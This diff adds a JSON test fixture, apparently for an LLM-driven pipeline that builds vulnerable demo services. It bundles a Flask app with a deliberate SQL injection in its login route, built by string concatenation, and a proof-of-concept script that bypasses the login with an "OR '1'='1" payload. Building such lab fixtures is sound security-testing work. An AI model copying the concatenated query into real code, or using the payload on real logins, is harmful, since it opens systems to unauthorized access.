@@ -1,0 +1,57 @@
+{
+  "intent": "Fixture-backed trusted dynamic SQL injection bundle",
+  "pattern_tags": [
+    "request_input",
+    "sql_injection",
+    "sql_sink"
+  ],
+  "files": [
+    {
+      "path": "Dockerfile",
+      "role": "helper",
+      "description": "Build Python image for trusted-dynamic SQLi bundle.",
+      "content": "FROM python:3.11-slim\nWORKDIR /app\nCOPY . /app\nRUN pip install --no-cache-dir -r requirements.txt\nEXPOSE 5000\nCMD [\"python\", \"app.py\"]\n"
+    },
+    {
+      "path": "requirements.txt",
+      "role": "helper",
+      "description": "Pinned deps for trusted-dynamic SQLi bundle.",
+      "content": "Flask==3.0.0\nrequests==2.31.0\n"
+    },
+    {
+      "path": "app.py",
+      "role": "service_main",
+      "description": "Flask app with an intentional SQL injection in the login route.",
+      "content": "from pathlib import Path\nimport sqlite3\nfrom flask import Flask, jsonify, request\n\napp = Flask(__name__)\nDB_PATH = Path('/tmp/sqli-demo.db')\nSCHEMA_SQL = '''\nCREATE TABLE IF NOT EXISTS users (\n    id INTEGER PRIMARY KEY AUTOINCREMENT,\n    username TEXT,\n    password TEXT\n);\nDELETE FROM users;\nINSERT INTO users (username, password) VALUES ('admin', 'secret');\nINSERT INTO users (username, password) VALUES ('guest', 'guest');\n'''\n\ndef init_db() -> None:\n    conn = sqlite3.connect(DB_PATH)\n    conn.executescript(SCHEMA_SQL)\n    conn.commit()\n    conn.close()\n\n@app.get('/health')\ndef health():\n    return {'ok': True}\n\n@app.get('/login')\ndef login():\n    query = (\n        \"SELECT id, username FROM users \"\n        \"WHERE username = '\" + request.args.get('username', '') + \"' \"\n        \"AND password = '\" + request.args.get('password', '') + \"'\"\n    )\n    conn = sqlite3.connect(DB_PATH)\n    conn.row_factory = sqlite3.Row\n    rows = conn.execute(query).fetchall()\n    conn.close()\n    return jsonify({'match': bool(rows), 'rows': [dict(row) for row in rows], 'query': query, 'flag': 'FLAG-sqli-demo-token'})\n\nif __name__ == '__main__':\n    init_db()\n    app.run(host='0.0.0.0', port=5000)\n"
+    },
+    {
+      "path": "poc.py",
+      "role": "poc_entry",
+      "description": "PoC that proves the SQL injection by bypassing login.",
+      "content": "import argparse\nimport requests\nimport sys\n\nSUCCESS_SIGNATURE = 'SQLi SUCCESS'\nFLAG_TOKEN = 'FLAG-sqli-demo-token'\nDEFAULT_PARAMS = {'username': \"admin' OR '1'='1\", 'password': 'irrelevant'}\n\ndef exploit(base_url: str) -> bool:\n    url = base_url.rstrip('/') + '/login'\n    try:\n        resp = requests.get(url, params=DEFAULT_PARAMS, timeout=5)\n        resp.raise_for_status()\n    except requests.RequestException as exc:\n        print(f'[trusted-dynamic-sqli] request failed: {exc}', file=sys.stderr)\n        return False\n    try:\n        payload = resp.json()\n    except ValueError:\n        return False\n    rows = payload.get('rows') or []\n    return any(isinstance(row, dict) and row.get('username') == 'admin' for row in rows) and str(payload.get('flag')) == FLAG_TOKEN\n\ndef main() -> None:\n    parser = argparse.ArgumentParser(description='Trusted-dynamic SQLi PoC')\n    parser.add_argument('--base-url', default='http://127.0.0.1:5000')\n    args = parser.parse_args()\n    if exploit(args.base_url):\n        print(SUCCESS_SIGNATURE)\n        print(FLAG_TOKEN)\n        raise SystemExit(0)\n    print('[trusted-dynamic-sqli] exploit did not succeed', file=sys.stderr)\n    raise SystemExit(1)\n\nif __name__ == '__main__':\n    main()\n"
+    },
+    {
+      "path": "README.md",
+      "role": "helper",
+      "description": "Quickstart instructions.",
+      "content": "# Trusted Dynamic SQLi bundle\n\nThis bundle is produced from a fixture-backed LLM manifest for regression testing.\n"
+    }
+  ],
+  "deps": [
+    "Flask==3.0.0",
+    "requests==2.31.0"
+  ],
+  "build": {
+    "command": "pip install --no-cache-dir -r requirements.txt"
+  },
+  "run": {
+    "command": "python app.py",
+    "port": 5000
+  },
+  "poc": {
+    "cmd": "python poc.py --base-url {{base_url}}",
+    "success_signature": "SQLi SUCCESS",
+    "flag_token": "FLAG-sqli-demo-token"
+  },
+  "notes": "Fixture-backed LLM manifest used to exercise the trusted-dynamic synthesis path without remote provider dependency."
+}
